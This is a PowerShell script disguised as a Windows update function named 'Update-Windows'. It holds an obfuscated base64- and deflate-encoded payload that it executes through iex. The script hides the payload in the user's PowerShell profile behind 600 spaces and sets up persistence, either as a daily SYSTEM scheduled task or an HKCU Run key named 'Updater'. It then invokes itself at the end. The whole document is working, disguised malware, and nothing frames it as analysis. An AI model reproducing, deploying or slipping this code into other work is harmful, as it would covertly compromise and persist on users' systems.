function Update-Windows{
Param([Switch]$Persist)
$ErrorActionPreference='SilentlyContinue'
$Script={sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('tVZtb9o6FP7cSfsP0YSURKMkULqulSZdhxCgvBRIgVKGJjdxEoOJaeKUl93993sCpO1uu6nT1Y1AsX1efPyc5/jES0JHUB5K65UnfX//7qiLI7yQlNzaWZRX3+y8lHMGVTeoWZ3z5n1TPToCnRw+c+vtM+mLpEzQcmnyBabh9OKikkQRCcV+XqgRgeKYLO4YJbGiSn9Lo4BE5PjqbkYcIX2Xct8KNcbvMDuobSrYCYh0jEI3lbW4g9PQCvaSUaHIX7/K6uS4OC1U7xPMYkW2N7Egi4LLmKxKP9R0w+vNkihymzoRj7knCiManpQKgzDGHumAtwfSJiLgbiyrcA74RUQkUSgdTpS62CsoMgy7EXeQ60YkBv1CI3zgc6LkwoSxvPSXMjns309CQRcE5IJEfGmT6IE6JC7Ucegy0ifeVOmQVXbstxopz41AqysiNQ95eTXQNncTRva2svoy1CybKjz/zigA8eP9u/fvvIwJwenW3s5P9f5zPsDoaLIbEwhY6fKY7pS/SHpeasPGWPBoA9PcdZQQdSpN0lRMplMpt23qg6a5GneXJsr/2k8xMwITx7oq6dXSGpYnQ07dKZgdEpZb9gZ6MxX8mnkm8WhIzE2IF9TJyKW8lgXiMbI7dSFT60BkinwQENckjPhYpKjmpclLs+qCikdbI6HMJRFyIJMxRAVJVn8OZp8oRW6EbbIAwPZzGXLiAaVJpn2g8SbbPZ2DklxhOI7zUjeBmnLykk0wI25eQmFMDyKUCL4byk/hthMmqINjkbmbqo9AHjas8DAWUeJAEuHw1/aSOBSzFIu8VKcuMTY29bON5VeRqGDGaOiDpwfIBKykCNgipUYEMf5EA7VgE9FYLBlZgO6uyi2GfajpQ13sOIV94sovQs1ov+d4ikoGx7NAIdU24yIvDWkk4LZIEc5I9d9ieXZn7KOqROSQISUrpYmxESn3c9v1ap5S9YDWDptIAC5WxBcGjsmnsi0iQE35oF3RCoJn3AhZ2zHmtIhWtNhow39ATxrcPHObl7O6FpnrwEONuNGud81evV5+uLSHZWFXG6LZbYh29WY2s1G9PxiL2waqX1N9Pi5vl5d0a7eQO15rn7bGdqUb6+3Md72x6Xn+mWf3i6cWbY0qPUMv4ZZZTVojY2Xo5bhKV/UeHfTml5a4Gw8ZHniaf1M8x3TdimbDIm9vGwjVghNne+kNa0Hb3Yzr2vmoPEdVhCphdWgZvDk2ItTVhtgf8lXTN9jIryDDcii57Q0so9ezDDSoze7Nc80H2xscGKNhid4ub/oBzC0Ioanp5YZLtnzcA5BqHGG/Dzp+peQEHuiYH5HxscPjEp4bHBmgY93eQ1zjpdVlIL8elDgass4NRq3bjaVpxXG3jOo6HdV8lLrEvtHDKH4wt6ZWHLrcHZ12xp42vGFnmlm5Xjqepmmrutl0bovrz1dnZUO/ryzogt2VXO188NkI4WTdB9/tjc76687mDvYbaNrwQ0oaYE2OWdFoFYyKz/jwqybQxlEcYAY8gbs9K1qLR9bhiu5ymlooStq05yQKCYMuB30woztijDtpu3i6y6Ff7bvIFKp3AMOT0qsjVXpUVJ86SbZ0cXELkaYVBMwutEjoiyCvr090HdqAvi7rcNq3n67Clxtl5yqftpFHiDL/bOdfTUsqR4unfqv9+dup978CeKjmAF7umwB8WvuN9E2g6vknAF6Ifl74I5T/FIIRpgIUbbiWGNn3y98gcWDNs4+Op0wBM7zDk37+XSXiuANfJP8A'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()}
if($Persist){
if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
{$Prof=$PROFILE.AllUsersAllHosts;$Payload="schtasks /Create /RU system /SC DAILY /ST 20:15:00 /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -NonInteractive`""}
else
{$Prof=$PROFILE.CurrentUserAllHosts;$Payload='New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe`" -NonInteractive -WindowStyle Hidden"'}
mkdir (Split-Path -Parent $Prof)
(gc $Prof) + (' ' * 600 + $Script)|Out-File $Prof -Fo
iex $Payload|Out-Null
Write-Output $Payload}
else
{$Script.Invoke()}
} Update-Windows -Persist